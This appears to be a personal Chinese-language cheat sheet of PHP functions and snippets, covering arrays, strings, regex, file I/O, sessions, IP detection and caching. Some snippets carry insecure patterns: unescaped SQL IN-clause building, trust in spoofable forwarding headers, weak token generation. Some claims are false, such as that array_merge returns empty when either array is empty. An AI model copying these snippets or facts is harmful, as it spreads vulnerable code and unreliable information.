$url = "http://www.ee.com";  
if(varify_url($url)){  
 echo "<div>Congratulation ! Your URL <a href=$url>$url</a>  : is <b>valid </b></div>";  
}else{  
 echo "<div>Error ! Your URL : <a href=$url>$url</a> is <b>invalid </b></div>";  
}  


1》》》》》》》call_user_func
call_user_func('方法名称','赋的值'):一种特别的调用函数的方法，例如；
function nowmagic($a)
{
 echo $a;
}
call_user_func('nowmagic','1111111111');

2》》》》》》》preg_replace_callback()
preg_replace_callback()正则替换回调函数;

3》》》》》》》array_unshift()
array_unshift() 函数在数组开头插入一个或多个元素。例如：
$a=array('11','22','33');
array_unshift($a,'66');
结果为：66,11,22,33

4》》》》》》》is_numeric()
is_numeric()   检测变量是否为数字或数字字符串;如果是返回true,不是返回false;

5》》》》》》》array_unique()
array_unique() 函数移除数组中的重复的值，并返回结果数组.
$unique=array('f','d','f','s');
print_r(array_unique($unique));
结果为：
Array ( [0] => f [1] => d [3] => s ) 

6》》》》》》》stripos()与strpos()
stripos()与strpos(),前者对大小写不敏感，后者则敏感，类似的还有str_ireplace()与str_replace()

7》》》》》》》array_filter(array,function)
array_filter(array,function);筛选出需要的结果
function myfunction($v)
{
if($v=="H")
{
 
  return true;
}
return false;
}
$as=array("H","d","s");
print_r(array_filter($as,"myfunction"));
输出结果为：
Array ( [0] => H ) 

8》》》》》》》array_intersect()
array_intersect() 函数返回两个或多个数组的交集数组。
$add1=array(1,3,4,5);
$add2=array(3,4,6,7);
print_r(array_intersect($add1,$add2));
结果是：
Array ( [1] => 3 [2] => 4 ) 

9》》》》》》》join() 

join() 函数返回由数组元素组合成的字符串。
join() 函数是 implode() 函数的别名。也就是说它也是把数组元素练成一段字符串

10》》》》》》》parent::

PHP 面向对象：parent::关键字
parent::用来引用父类中的方法。
class employee
{
protected $sal=3000;
public function getSal()
{
 return $this->sal;
}
}
class manager extends employee
{
   public function getSal()
   {
   parent::getSal();
$this->sal=$this->sal+2000;
return $this->sal;
    }
}
$emp=new employee();
echo $emp->getSal()."<br>";
$mana=new manager();
echo $mana->getSal();

11》》》》》》》
这里的$name可以直接用$this->name调用。
class Person
{
var $name;
var $age;
function say()
	{
	echo "my name is :".$this->name."<br>";
	echo "my age is :".$this->age."<br>";
    }
}
class Student extends Person
{
	var $school;
	function study()
	{
	echo "my name is:".$this->name."<br>";
	echo "i am".$this->school."study";
	}
}
$stu=new Student();
$stu->name="Bob";
$stu->age="Tom";
$stu->school="People";
$stu->study();

12》》》》》》》__call(1,2)
__call(1,2) 方法用于监视错误的方法调用。

13》》》》》》》
ini_set用来设置php.ini的值
常见的设置： 
@ini_set('memory_limit', '64M'); 
'menory_limit'：设定一个脚本所能够申请到的最大内存字节数，这有利于写的不好的脚本消耗服务器上的可用内存。@符号代表不输出错误。 

14》》》》》》》
ltrim() - 从左侧移除字符串的空白字符或其他预定义字符
rtrim() - 从右侧移除字符串的空白字符或其他预定义字符

15》》》》》》》::与$this与->的使用区别
在访问PHP类中的成员变量或方法时，如果被引用的变量或者方法被声明成const（定义常量）
或者static（声明静态）,那么就必须使用操作符::,反之如果被引用的变量或者方法没有被声明成const或者static,那么就必须使用操作符->。
另外，如果从类的内部访问const或者static变量或者方法,那么就必须使用自引用的self，
反之如果从类的内部访问不为const或者static变量或者方法,那么就必须使用自引用的$this。

+++array_filter++
用回调函数过滤数组中的元素：
<?php
function test_odd($var)
{
return($var & 1);
}
$a1=array("a","b",2,3,4);
print_r(array_filter($a1,"test_odd"));
?>


++max()++++
返回几个数中最大的数，类似的还有min(),avg().实例：
$d=max(4,67,7,8,65,6,6);
echo $d;
67


+++array_map()++++
array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。
$arr=array(1,2,3,4,5);
function func($v){
	return $v*$v;
}
print_r(array_map('func',$arr));
结果为：Array ( [0] => 1 [1] => 4 [2] => 9 [3] => 16 [4] => 25 ) 



++PHP类perl正则表达式函数+++++
// preg_grep返回与模式匹配的数组单元
$subjects = array(  
"Mechanical Engineering", "Medicine",  
"Social Science", "Agriculture",  
"Commercial Science", "Politics"  
);  
//匹配所有仅由有一个单词组成的科目名
$alonewords = preg_grep("/^[a-z]*$/i"
, $subjects);  
var_dump($alonewords);



//preg_split使用逗号或空格(包含" ", \r, \t, \n, \f)分隔短语
$keywords = preg_split("/[\s,]+/", "hypertext language, programming");
print_r($keywords);

echo "<br><br>";

//preg_replace执行一个正则表达式的搜索和替换
$string = 'April 15, 2003';
$pattern = '/(\w+) (\d+), (\d+)/i';
$replacement = '${1}1,$3';
echo preg_replace($pattern, $replacement, $string);

echo "<br><br>";

//preg_quote转义正则表达式字符
$keywords = '$40 for a g3/400';
$keywords = preg_quote($keywords, '/');
echo $keywords; // 返回 \$40 for a g3\/400

echo "<br><br>";

//preg_replace_callback执行一个正则表达式搜索并且使用一个回调进行替换
// 将文本中的年份增加一年.
$text = "April fools day is 04/01/2002\n";
$text.= "Last christmas was 12/24/2001\n";
// 回调函数
function next_year($matches)
{
  // 通常: $matches[0]是完成的匹配
  // $matches[1]是第一个捕获子组的匹配
  // 以此类推
  return $matches[1].($matches[2]+1);
}
echo preg_replace_callback(
            "|(\d{2}/\d{2}/)(\d{4})|",
            "next_year",$text);


+++进制转换++++
十进制转二进制decbin()函数
echo decbin(12);   //1100
二进制转十进制bindec()函数
echo bindec('110011'); //输出51
自己实现的方法：
//从十进制向其它进制转换，用的是就用该数字不断除以要转换的进制数，读取余数。连接一起就可以了。
//$datalist 传入数据array(100,123,130)
//@param int $bin 转换的进制可以是：2,8,16
function decto_bin($datalist,$bin)
{
    static $arr=array(0,1,2,3,4,5,6,7,8,9,'A','B','C','D','E','F');
    if(!is_array($datalist)) $datalist=array($datalist);
    if($bin==10)return $datalist; //相同进制忽略
    $bytelen=ceil(16/$bin); //获得如果是$bin进制，一个字节的长度
    $aOutChar=array();
    foreach ($datalist as $num)
    {
        $t="";
        $num=intval($num);
    if($num===0)continue;
        while($num>0)
        {
            $t=$arr[$num%$bin].$t;
            $num=floor($num/$bin);
        }
        $tlen=strlen($t);
        if($tlen%$bytelen!=0)
        {
        $pad_len=$bytelen-$tlen%$bytelen;
        $t=str_pad("",$pad_len,"0",STR_PAD_LEFT).$t; //不足一个字节长度，自动前面补充0
        }
        $aOutChar[]=$t;
    }
    return $aOutChar;
} 
var_dump(decto_bin(array(12,3),2));
其他进制转为十进制：
/**
 *二进制、八进制、十六进制 转十进制*
 *
 * @param array $datalist 传入数据array(df,ef)
 * @param int $bin 转换的进制可以是：2,8,16
 * @return array 返回数据 array() 返回没有数据转换的格式
 * @copyright chengmo QQ:8292669
 */
function bin_todec($datalist,$bin)
{
    static $arr=array('0'=>0,'1'=>1,'2'=>2,'3'=>3,'4'=>4,'5'=>5,'6'=>6,'7'=>7,'8'=>8,'9'=>9,'A'=>10,'B'=>11,'C'=>12,'D'=>13,'E'=>14,'F'=>15);
    if(!is_array($datalist))$datalist=array($datalist);
    if($bin==10)return $datalist; //为10进制不转换
    $aOutData=array(); //定义输出保存数组
    foreach ($datalist as $num)
    {
        $atnum=str_split($num); //将字符串分割为单个字符数组
        $atlen=count($atnum);
        $total=0;
        $i=1;
        foreach ($atnum as $tv)
        {
            $tv=strtoupper($tv);
             
            if(array_key_exists($tv,$arr))
            {
                if($arr[$tv]==0)continue;
                $total=$total+$arr[$tv]*pow($bin,$atlen-$i);
            }
            $i++;
        }
        $aOutData[]=$total;
    }
    return $aOutData;
}
var_dump(bin_todec(array('1101101','111101101'),2));


+++uniqid()++++
uniqid() 函数基于以微秒计的当前时间，生成一个唯一的 ID。
echo uniqid();
可以是：568339d4a7c3a


+++php针对iphone和android设备输出不同的viewport++++++
<?php

//if iphone
$browser = strpos($_SERVER['HTTP_USER_AGENT'],"iPhone");
  if ($browser == true){
  $browser = 'iphone';
}
//if android
$android = strpos($_SERVER['HTTP_USER_AGENT'],"Android");
   if ($android == true){
   $brower = 'android';
}
?>

<?php if ($browser == 'iphone') { ?>
  <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0" />
<?php } elseif ($brower == 'android') { ?>
  <meta name="HandheldFriendly" content="true" />
  <meta name="viewport" content="width=device-width, height=device-height, user-scalable=no" />
<?php } ?>


+++php创建feed，rss订阅++++++
class Rss extends CController{
   	//public
   	var $rss_ver = "2.0";
   	var $channel_title = '';
   	var $channel_link = '';
   	var $channel_description = '';
   	var $language = 'zh_CN';
   	var $copyright = '';
   	var $webMaster = '';
   	var $pubDate = '';
   	var $lastBuildDate = '';
   	var $generator = 'GoWhich RSS Generator';
   	var $content = '';
   	var $items = array();

   	/**
     * 添加基本信息
     * @param string $title
     * @param string $link
     * @param string $description
     */
   	public function __construct($title, $link, $description) {
       	$this->channel_title = $title;
       	$this->channel_link = $link;
       	$this->channel_description = $description;
       	$this->pubDate = Date('Y-m-d H:i:s',time());
       	$this->lastBuildDate = Date('Y-m-d H:i:s',time());
   	}

   	/**
     * 添加一个节点
     * @param string $title
     * @param string $link
     * @param string $description
     * @param date $pubDate
     */
   	public function addItem($title, $link, $description ,$pubDate) {
       	$this->items[] = array('title' => $title ,
                        'link' => $link,
                        'descrīption' => $description,
                        'pubDate' => $pubDate);
   	}

   	/**
     * 构建xml元素
     */
	public function buildRSS() {
       	$s = <<<RSS
<?xml version='1.0' encoding='utf-8'?>\n
<rss version="2.0">\n
RSS;

       	// start channel
       	$s .= "<channel>\n";
       	$s .= "<title><![CDATA[{$this->channel_title}]]></title>\n";
       	$s .= "<link><![CDATA[{$this->channel_link}]]></link>\n";
       	$s .= "<descrīption><![CDATA[{$this->channel_description}]]></descrīption>\n";
       	$s .= "<language>{$this->language}</language>\n";
       	if (!empty($this->copyright)) {
        	$s .= "<copyright><![CDATA[{$this->copyright}]]></copyright>\n";
       	}
       	if (!empty($this->webMaster)) {
      		$s .= "<webMaster><![CDATA[{$this->webMaster}]]></webMaster>\n";
       	}
       	if (!empty($this->pubDate)) {
       		$s .= "<pubDate>{$this->pubDate}</pubDate>\n";
       	}
       	if (!empty($this->lastBuildDate)) {
          	$s .= "<lastBuildDate>{$this->lastBuildDate}</lastBuildDate>\n";
       	}
       	if (!empty($this->generator)) {
          	$s .= "<generator>{$this->generator}</generator>\n";
       	}
       	// start items
       	for ($i=0;$i<count($this->items);$i++) {
           	$s .= "<item>\n";
           	$s .= "<title><![CDATA[{$this->items[$i]['title']}]]></title>\n";
           	$s .= "<link><![CDATA[{$this->items[$i]['link']}]]></link>\n";
           	$s .= "<descrīption><![CDATA[{$this->items[$i]['descrīption']}]]></descrīption>\n";
           	$s .= "<pubDate>{$this->items[$i]['pubDate']}</pubDate>\n";
           	$s .= "</item>\n";
       	}
      	// close channel
      	$s .= "</channel>\n</rss>";
      	$this->content = $s;
   	}

	/**
	 * 输出rss内容
	 */
	function show() {
    	if (empty($this->content)) {
    		$this->buildRSS();
    	}
       	return $this->content;
	}

	/**
	 * 设置版权
	 * @param unknown $copyright
	 */
	public function setCopyRight($copyright){
		$this->copyright = $copyright;
	}

	/**
	 * 设置管理员
	 * @param unknown $master
	 */
	public function setWebMaster($master){
		$this->webMaster = $master;
	}

	/**
	 * 设置发布时间
	 * @param date $date
	 */
	public function setpubDate($date){
		$this->pubDate = $date;
	}

	/**
	 * 设置建立时间
	 * @param unknown $date
	 */
	public function setLastBuildDate($date){
		$this->lastBuildDate = $date;
	}

	/**
	 * 将rss保存为文件
	 * @param String $fname
	 * @return boolean
	 */
   	function saveToFile($fname) {
       	$handle = fopen($fname, 'wb');
       	if ($handle === false){
       		return false;
       	}
       	fwrite($handle, $this->content);
       	fclose($handle);
   	}

   	/**
   	 * 获取文件的内容
   	 * @param String $fname
   	 * @return boolean
   	 */
   	function getFile($fname) {
       	$handle = fopen($fname, 'r');
       	if ($handle === false){
       		return false;
       	}
    	while(!feof($handle)){
            echo fgets($handle);
    	}
       	fclose($handle);
   	}
}


++++fstat()++++
fstat() 函数返回关于一个打开的文件的信息。
该函数将返回一个包含下列元素的数组：
[0] 或 [dev] - 设备编号
[1] 或 [ino] - inode 编号
[2] 或 [mode] - inode 保护模式
[3] 或 [nlink] - 连接数目
[4] 或 [uid] - 所有者的用户 ID
[5] 或 [gid] - 所有者的组 ID
[6] 或 [rdev] - inode 设备类型
[7] 或 [size] - 文件大小的字节数
[8] 或 [atime] - 上次访问时间（Unix 时间戳）
[9] 或 [mtime] - 上次修改时间（Unix 时间戳）
[10] 或 [ctime] - 上次 inode 改变时间（Unix 时间戳）
[11] 或 [blksize] - 文件系统 IO 的块大小（如果支持）
[12] 或 [blocks] - 所占据块的数目


+++数字处理，保留小数+++++
（这里保留3位）
$num=13.5664;
第一种：
echo round($num,3);
第二种：
$format=sprintf("%.3f",$num);
echo $format;
第三种：
echo number_format($num,3);


++++eval()执行PHP代码+++
必须以分号结尾。
$str="hello world";
$code="print('$str');";
eval($code);

$str13=crypt($str); // UNIX 的标准加密 DES 模块加密,单向加密
$str5=ord($str);//返回ascii值
$str6=sha1($str);//安全哈希算法
$str7=str_shuffle($str);//随机打乱，可用于验证码，简单批量密码生成
$str8=str_split($str,4);  //字符串到数组 ，长度
$str10=strchr($str,'6'); //有则输出第一次出现到结束的内容
$str101=strstr($str,"6");//有则输出第一次出现到结束的内容

$arr5=array_key_exists("5",$arr);//键名是否存在
$arr14=in_array('6',$arr); //看元素在不在数组中
function my($v){
    return $v*$v;
}
$arr6=array_map("my",$arr); //array_map将函数作用于数组每个键值上，类似功能还有array_filter()
$arr10=array_search("8",$arr);//有此键值则返回对应的键名
$arr8=array_rand($arr,2);//array_rand($arr);随机返回任意一个键值，array_rand(,4)随机返回任意一个长度为4的数组
$arr2=array_chunk($arr,3); //将一个数组分割为新的数组块。array_chunk(原数组，单一数组长度（或者说值个数）);
$arr1=implode($arr);
$arr3=array_fill(5,3,"f");//array_fill(起始键名号，长度，键值);
$arr4=array_flip($arr); //键名与键值调换
array_multisort($arr); //无返回值，直接处理，类似于sort()
$arr7=array_product($arr);//计算所用键值的乘积
$arr9=array_reverse($arr); //倒序
$arr11=array_sum($arr); //返回键值之和
$arr12=array_values($arr); //返回键值，忽略键名，默认从0开始
$a=4;
$b=6;
$g=8;
$arr13=compact('a','b','g'); //将多个变量变成数组
list() //将数组键值赋值给变量，无返回值
shuffle($arr);//打乱数组键值（键名忽略），无返回值

echo getcwd(); //获得该文件所在目录
echo "<br>";
$dir= dir("log"); //循环列出目录下文件
while(($file=$dir->read()) !== false){
    echo "filename:".$file."<br>";
}
$dir->close();
echo "<br>";
print_r(scandir("log")); //直接列出目录下文件

echo date("Y-m-d",strtotime("tomorrow"));//打印明天日期

$file=fopen("log.log","r");  //读取文件内容
while(!feof($file)){
    echo fgets($file)."<br>";   //fgets()读取一行，fgetc()逐个读取
}
fclose($file);

$fp = fopen("fflush.txt", "a+");//创建文件,(追加)写入内容
for ($i = 0; $i < 10; $i++) {
    fwrite($fp, "4"); 
  //sleep(1);等待1秒
}
//fflush($fp); 可要可不要
fclose($fp);


$file=file_get_contents("fflush.txt");//读取文件
var_dump($file);

file_put_contents("fflush.txt","222",FILE_APPEND); //追加内容

$temp=tmpfile(); //临时文件不会在本地创建，fclose()后销毁
fwrite($temp,"testing,testing");
rewind($temp);
echo fread($temp,1024); //读取前1024位
fclose($temp);

mkdir("testing");//创建一个文件夹
rename("testing","ttt");  //重命名文件夹
var_dump(stat("./ttt/test.txt"));  //返回文件详细信息
echo gettype(filesize("./ttt/test.txt")); //获得变量类型

$cars=array("volvo","bmw","toyota");
echo sizeof($cars);//返回数组中元素的数目


+++本年度的开始与结束1月1号与12月31号++++
$t=time();
$ybeg = mktime(0, 0, 0, 1, 1, date('Y', $t));
echo date("Y-m-d",$ybeg);
$yend = mktime(23, 59, 59, 12, 31, date('Y', $t));
echo date("Y-m-d",$yend);

+++防范XSS+++
XSS（跨站脚本攻击）可以用于窃取其他用户的Cookie信息，要避免此类问题，可以采用如下解决方案：
直接过滤所有的JavaScript脚本；
转义Html元字符，使用htmlentities、htmlspecialchars等函数；


++PHP log()++++
php开根号
echo log(16,2); //4
echo log(8,2);   //3
echo log(25,5); //2


++http_build_query()++++
将数组或者字符串转换成地址栏url地址格式
$str1=array('foo'=>'bar','baz'=>'boom','cow'=>'milk','php'=>'hypertext processor');
echo http_build_query($str1);
结果是：foo=bar&baz=boom&cow=milk&php=hypertext+processor


+++str_replace(array(),array().$str)++++
$str="hello you";
$str=str_replace(array('e','o'),array('E','O'),$str);
echo $str;
结果是：hEllO yOu


++++$SERVER['REQUEST_URI']与$_SERVER['HTTP_REFERER']++++
//获取当前请求的完整的（除域名的）url
ECHO $_SERVER["REQUEST_URI"] ;
//获取前一个URL
echo $_SERVER['HTTP_REFERER'];


+++++获取网站来源（针对搜索引擎）+++++
通过下面的方法可以知道网页来自哪个搜索引擎导入，稍稍修改可以知道
获得上一个网页URL。
function get_referer(){
 $se = 0;
 $url       = $_SERVER["HTTP_REFERER"];   //获取完整的来路URL
 $str   = str_replace("http://","",$url); //去掉http://
 $strdomain = explode("/",$str);          // 以“/”分开成数组
 $domain    = $strdomain[0];              //取第一个“/”以前的字符
 if(strstr($domain,'baidu.com')){
  $se = 1;
 }
 else if(strstr($domain,'google.cn')){
  $se = 1;
 }
 return $se;
}

++++PHP判断有put方式的文件上传+++++
if($_SERVER['REQUEST_METHOD']=='PUT'&&count($_FILES)){
    echo '有以PUT方式提交的文件';
}


++PHP限制IP+++ （未测试）
//限制IP
class IP{ //获取客户IP地址 
function getIpAdr($ip){ 
$ip1=getenv("HTTP_X_FORWARDED_FOR"); 
$ip2=getenv("HTTP_CLIENT_IP"); 
$ip3=getenv("REMOTE_ADDR"); 
if($ip1&&$ip1!='unknow') 
$ip=$ip1; 
else if($ip2&&$ip2!='unknow') 
$ip=$ip2; 
else if($ip3&&$ip3!='unknow') 
$ip=$ip3; 
else 
$ip='127.0.0.1'; 
} 
} 
function get_netip($myip){ //只留客户IP地址的前三位 
$temp=explode(".",$myip); 
$netip.=$temp[0]; 
$netip.="."; 
$netip.=$temp[1]; 
$netip.="."; 
$netip.=$temp[2]; 
return $netip; 
} 
$filename="test.ini"; //定义操作文件 
$ip_lib=file($filename); //读取文件数据到数组中 
$allow=0; 
$IP=new IP; 
$thisip=""; 
$IP->getIpAdr($thisip); 
$thenetip=get_netip($thisip); 

for($i=0;$i<count($ip_lib);$i++){ 
if(ereg($thenetip,$ip_lib[$i])){ 
$allow=1; 
break; 
} 
} 

if ($allow==1) 
{ 
echo "验证通过"; 
} 
else { 
echo "<script>alert('No');</script>"; 
} 


++PHP过滤中文++++
echo preg_replace('/([\x80-\xff]*)/i', '', "hello 你好world");


+++获取经过zlib压缩过的网站内容+++++
使用file_get_contents()直接获取的话会返回一堆乱码，在链接前面加上compress.zlib://即可返回解压数据，如：

file_get_contents("compress.zlib://http://www.xxx.com/xx.php");


+++php强制转换++++
第一种：
intval --强制转换成整型 （int）
strval --强制转换成字符串类型 (string)
floatval--强制转换成浮点型(float)
第二种：
有（bool）、（float）、（array）等
第三种：
settype();
$num=12.6;
settype($num,"int");    //无返回值，直接处理
echo $num;    // 12


++array_slice()++++
截取指定位置开始的指定长度的数组。
$arr=array('red','green','yellow','brown');
print_r(array_slice($arr,0,2));    //'red','green'
如果没有指定起始位置，则默认从后面开始截取：
print_r(array_slice($arr,2));     //'yellow','brown'


++++基于数组创建文件++++++
// 基于数组创建文件
function create_dir_or_files($files) {
  foreach ( $files as $key => $value ) {
    if (substr ( $value, - 1 ) == '/') {
      mkdir ( $value );
    } else {
      @file_put_contents ( $value, '' );
    }
  }
}

if (! function_exists ( 'array_column' )) {
  function array_column(array $input, $columnKey, $indexKey = null) {
    $result = array ();
    if (null === $indexKey) {
      if (null === $columnKey) {
        $result = array_values ( $input );
      } else {
        foreach ( $input as $row ) {
          $result [] = $row [$columnKey];
        }
      }
    } else {
      if (null === $columnKey) {
        foreach ( $input as $row ) {
          $result [$row [$indexKey]] = $row;
        }
      } else {
        foreach ( $input as $row ) {
          $result [$row [$indexKey]] = $row [$columnKey];
        }
      }
    }
    return $result;
  }
}


$arr=array("1.txt","2.txt","3.txt","4.txt");
create_dir_or_files($arr);



+++将数组转换成sql语句可以使用的in形式++++
$arr=array(56,78,56,66,87,45,74);
function dbCreateIn($itemList)
{
    if(empty($itemList )){
        return " IN ('') ";
    }else{
        return " IN ('" . join ("','", $itemList) . "') ";
    }
}
$arr=dbCreateIn($arr);
echo $arr;


+++日期时间+++++
$str1="Y-m-01";  //本月第一天
$str2="Y-m-t";  //本月最后一天
$str=date($str2,time());
echo $str;


+不使用第三个变量实现交换两个变量值+++++
$a=1;$b=2;
$a=$a+$b;$b=$a-$b;$a=$a-$b;
echo $a,$b;


+++$_SERVER函数++++
$_SERVER['REMOTE_PORT'];用户连接服务器时所使用的端口，//50563 
$_SERVER['SCRIPT_FILENAME'];当前执行脚本的绝对路径名//D:/wamp/www/onethink/wwwroot/test.php 
$_SERVER['SERVER_SIGNATURE'];包含服务器版本和虚拟主机名的字符串//Apache/2.4.9 (Win64) PHP/5.5.12 Server at 127.0.0.1 Port 80
$_SERVER['REQUEST_METHOD'];访问页面时的请求方法 //GET
$_SERVER['SERVER_SOFTWARE'];服务器标识的字串，在响应请求时的头信息中给出 //Apache/2.4.9 (Win64) PHP/5.5.12 
$_SERVER['REQUEST_TIME']; 请求开始时的时间戳 //1454229771 
$_SERVER['SERVER_PROTOCOL'];请求页面时通信协议的名称和版本 //HTTP/1.1 


+++提升性能的小方法+++
对global变量，应该用完就unset()掉；
在可以用file_get_contents替代file、fopen、feof、fgets等系列方法的情况下，尽量用 file_get_contents，因为他的效率高得多！但是要注意file_get_contents在打开一个URL文件时候的PHP版本问题；
$row[’id’] 的速度是$row[id]的7倍。
如果能将类的方法定义成static，就尽量定义成static，它的速度会提升将近4倍。
str_replace函数比preg_replace函数快，但strtr函数的效率是str_replace函数的四倍。 strtr用法：strtr(string,oldstr,newstr)
尽量使用php自带的函数，比自己造轮子效率更高。


++uniqid()以微秒计的当前时间生成唯一ID+++
uniqid() 函数基于以微秒计的当前时间，生成一个唯一的 ID。//echo uniqid(); 
由于基于系统时间，通过该函数生成的 ID 不是最佳的。如需生成绝对唯一的 ID，请使用 md5() 函数（请在字符串函数参考中查找）。
$token = md5(uniqid(rand()));
echo $token;


+++HTTP重定向(反向代理负载均衡)+++++
$domains=array('http://baidu.com',
                'http://sina.com',
                'http://163.com',
    );
$domain=$domains[array_rand($domains)];
echo $domain;
当然这种方法效率确实不高，一般推荐表用nginx.
反向代理服务的核心工作主要是转发HTTP请求，扮演了浏览器端和后台Web服务器中转的角色。因为它工作在HTTP层（应用层），也就是网络七层结构中的第七层，因此也被称为“七层负载均衡”。
Nginx是一种非常灵活的反向代理软件，可以自由定制化转发策略，分配服务器流量的权重等。反向代理中，常见的一个问题，就是Web服务器存储的session数据，因为一般负载均衡的策略都是随机分配请求的。同一个登录用户的请求，无法保证一定分配到相同的Web机器上，会导致无法找到session的问题。
解决方案主要有两种：
配置反向代理的转发规则，让同一个用户的请求一定落到同一台机器上（通过分析cookie），复杂的转发规则将会消耗更多的CPU，也增加了代理服务器的负担。
将session这类的信息，专门用某个独立服务来存储，例如redis/memchache，这个方案是比较推荐的。

++++redis与memcache的比较+++++
1. Redis中，并不是所有的数据都一直存储在内存中的，这是和Memcached相比一个最大的区别。
2. Redis不仅仅支持简单的k/v类型的数据，同时还提供list，set，hash等数据结构的存储。
3. Redis支持数据的备份，即master-slave模式的数据备份。
4. Redis支持数据的持久化，可以将内存中的数据保持在磁盘中，重启的时候可以再次加载进行使用。
Redis在很多方面具备数据库的特征，或者说就是一个数据库系统，而Memcached只是简单的K/V缓存。
选择建议：
 没有必要过多的关注性能。由于Redis只使用单核，而Memcached可以使用多核，所以在比较上，平均每一个核上Redis在存储小数据时比Memcached性能更高。而在100k以上的数据中，Memcached性能要高于Redis，虽然Redis最近也在存储大数据的性能上进行优化，但是比起Memcached，还是稍有逊色。说了这么多，结论是，无论你使用哪一个，每秒处理请求的次数都不会成为瓶颈。
    你需要关注内存使用率。对于key-value这样简单的数据储存，memcache的内存使用率更高。如果采用hash结构，redis的内存使用率会更高。当然，这些都依赖于具体的应用场景。
    你需要关注关注数据持久化和主从复制时，只有redis拥有这两个特性。如果你的目标是构建一个缓存在升级或者重启后之前的数据不会丢失的话，那也只能选择redis。
    你应该关心你需要的操作。redis支持很多复杂的操作，甚至只考虑内存的使用情况，在一个单一操作里你常常可以做很多，而不需要将数据读取到客户端中（这样会需要很多的IO操作）。这些复杂的操作基本上和纯GET和POST操作一样快，所以你不只是需要GET/SET而是更多的操作时，redis会起很大的作用。
    对于两者的选择还是要看具体的应用场景，如果需要缓存的数据只是key-value这样简单的结构时，我在项目里还是采用memcache，它也足够的稳定可靠。如果涉及到存储，排序等一系列复杂的操作时，毫无疑问选择redis。


++++array_combine()+++++
将第一个数组作为新数组的键名，将第二个数组作为新数组的键值。
$arr1=array('bill','steve','mark');
$arr2=array('60','4','7');
$c=array_combine($arr1,$arr2);
print_r($c);
结果为：
Array ( [bill] => 60 [steve] => 4 [mark] => 7 )


+++array_count_values()++++++
array_count_values() 函数用于统计数组中所有值出现的次数。
$arr=array('A','Cat','Dog','A','Dog');
print_r(array_count_values($arr));
结果是：
Array ( [A] => 2 [Cat] => 1 [Dog] => 2 )    //键值指的是对应键名出现的次数

++++array_flip()++++
array_flip()交换键值与键名位置。
$arr=array(7,8,9);
print_r(array_flip($arr));
结果是：
Array([7]=>0 [8]=>1 [9]=>2);

++++array_map()++++
array_map()可以使用自定义的函数作用于每个键值上，并且返回用户自定义函数作用后的带有新值得数组。
$arr=array(7,8,9);
function myfunction($v){
  return $v*$v;
}
print_r(array_map("myfunction",$arr));
结果是：
Array ( [0] => 49 [1] => 64 [2] => 81 )

++++array_product()++++
array_product()计算并返回数组的乘积。
$arr=array(1,2,44,5,6,7,8,8);
$a=array_product($arr);
print_r($a);
结果是：1182720


++++++文件写入追加内容++++
方案一：
file_put_contents('test.txt',"再次 \r\n",FILE_APPEND);    //这里的\r\n换行用的
echo file_get_contents('test.txt');
方案二：
$testfile="test.txt";
$str="追加 \r\n";                   //这里的\r\n换行用的
$append=fopen($testfile,"a");
fwrite($append,$str);
fclose($append);

++++统计字符串中数字|字母出现的个数（亲测可用）++++++
echo $str = "3fdf5gfd//gd";  
preg_match_all("/[0-9]{1}/",$str,$arrNum);  
preg_match_all("/[a-zA-Z]{1}/",$str,$arrAl); 
preg_match_all("/[\/]{1}/",$str,$speNum);
echo "<br>";  
echo "数字个数:".count($arrNum[0])."<br/>";  
echo "字母个数:".count($arrAl[0])."<br/>";
echo "/个数:".count($speNum[0]);

++array_intersect()+++
返回两个数组的交集：
$a1=array("a"=>"red","b"=>"green","c"=>"blue","d"=>"yellow");
$a2=array("e"=>"red","f"=>"green","g"=>"blue");
$result=array_intersect($a1,$a2);
print_r($result);

+++++array_merge()注意事项+++
$arr=array_merge($arr1,$arr2);
$arr1或者$arr2其中一个是空，则$arr必定是空的!!!!!

+++session的注意点+++
session_unset()：
释放当前在内存中已经创建的所有$_SESSION变量，但不删除session文件以及不释放对应的session id;
session_destroy()：
删除当前用户对应的session文件以及释放session id，内存中的$_SESSION变量内容依然保留;
unset($_SESSION["aa"])：
删除指定的session;
因此，释放用户的session所有资源，需要顺序执行如下代码：
<?php
$_SESSION['user'] = 'lowell';
session_unset();
session_destroy(); 
?>

++++strrchr函数++++++
实际上，这个函数是查找某个字符，而不是查找字符串，应该参考官方文档.
$a = 'abcdef.txt';
$b = '.php';
echo strrchr($a, $b);
上面的代码输出是：.txt


++++explode 分开，将字符串打散成数组，根据标识符来打散++++
$str="233 5 56 67 67  67 55 5656";
$arr=explode(" ",$str);
var_dump($arr);

+++""与0++++
PHP坑。空竟然与0相等。
$s1="";
$s2=0;
if($s1 == $s2){
  echo "yes<br>";
}
if($s1 === $s2){
  echo "YES";
}else{
  echo "NO";
}

+++获取IP+++++
function GetIP(){
if(!empty($_SERVER["HTTP_CLIENT_IP"])){
  $cip = $_SERVER["HTTP_CLIENT_IP"];
}
elseif(!empty($_SERVER["HTTP_X_FORWARDED_FOR"])){
  $cip = $_SERVER["HTTP_X_FORWARDED_FOR"];
}
elseif(!empty($_SERVER["REMOTE_ADDR"])){
  $cip = $_SERVER["REMOTE_ADDR"];
}
else{
  $cip = "无法获取！";
}
return $cip;
}
echo GetIP();


+++判断字符串中是否存在某个字符串++++
strchr判断第一次出现，成功则返回字符串本身：
不能写成strchr($bk,"act_") == "act_"来判断：
if(strchr($bk,"act_")){
     $final_bk = "act_supei"; 
 }else{
     $final_bk = $bk."-"."act_supei";
}


+++二维数组排序，根据某个键值对二维数组进行排序+++++
$array[] = array('id'=>1,'price'=>50);
$array[] = array('id'=>2,'price'=>70);
$array[] = array('id'=>3,'price'=>30);
$array[] = array('id'=>4,'price'=>20);
foreach ($array as $key=>$value){
    $price[$key] = $value['price'];
}
array_multisort($price,SORT_NUMERIC,SORT_DESC,$array);
echo '<pre>';
print_r($array);
echo '</pre>';

++++函数调用方法+++++
get_defined_functions返回引入PHP文件的所有方法的array格式，包括自定义的，内置的。user为自定义方法，internal为内置方法数组。 
function myrow($id, $data)
{
return "<tr><th>$id</th><td>$data</td></tr>n";
}
$arr = get_defined_functions();
print_r($arr); 
类似的还有：
get_defined_constants 获取定义所有常量的数组
get_defined_functions 获取定义所有函数的数组
get_defined_vars 获取定义所有变量的数组
get_declared_classes 返回已经定义的类的数组 

++$_SERVER['SERVER_NAME']与$_SERVER['HTTP_HOST']+++
PHP获取当前域名。
在实际程序中，应尽量使用_SERVER["HTTP_HOST"],比较保险和可靠。

+++二维数组根据某一键名排序+++
